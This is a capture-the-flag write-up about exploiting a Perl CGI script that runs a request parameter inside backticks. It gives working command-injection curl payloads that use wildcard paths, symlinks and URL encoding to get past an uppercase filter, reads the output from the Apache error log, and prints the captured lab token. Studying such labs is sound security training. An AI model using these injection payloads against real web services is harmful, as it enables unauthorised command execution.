# Here is a perl script

```bash
cat level12.pl
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; # lowercase to uppercase
  $xx =~ s/\s.*//; # delete space ? 
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # HERE, we can exec cmd cuz of ``
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

# We can verify the connexion

curl -I 192.168.XX.XX:4646

```bash
HTTP/1.1 200 OK
Date: Wed, 06 Nov 2024 15:45:43 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html
```
- the `` mean that we can execute parameter but there is a substitution before

- We have to send in "x" parameter a cmd to exec, but it will transform it on uppercase (we dont want that)

- Lets try with env variable ? 
```bash 
export CMD="getflag > /tmp/coucou && chmod 777 /tmp/coucou"
curl 192.168.56.104:4646?x=`$CMD`
```

- Doesnt work because the env is for level12 and flag12 doesnt have permissions access

# If the file has a unique name, we can find it and execute it thanks to a wildcard

- example: 
```bash
ln -s /bin/getflag /tmp/TOTO/GETFLAG
/*/TOTO/GETFLAG
```

- We have to redirect it to a file

```bash
echo coucou > /tmp/COUCOU
curl 192.168.56.104:4646?x=;/*/GETFLAG > /*/COUCOU;
```

- Doesnt work...

- lets watch Apache: 

```bash
tail var/log/apache2/error.log
```

- Lets try : curl 192.168.56.104:4646?x=`/*/TOTO/GETFLAG>&2`
or curl 192.168.56.104:4646?x=`/*/TOTO/GETFLAG>&2`

- doesnt work... 

- WE DONT HAVE TO PUT SPACE

- We have to redirect on the stderr to have the answer on apache2 error.log

- It takes & as a second arg, so we have to encode it : https://www.urlencoder.org/

```bash
curl '192.168.56.104:4646?x=`%2F%2A%2FTOTO%2FGETFLAG%3E%262`'
```

- then : 
```bash
tail /var/log/apache2/error.log
```

# Token: 
g1qKMiRpXf53AWhDaU7FEkczr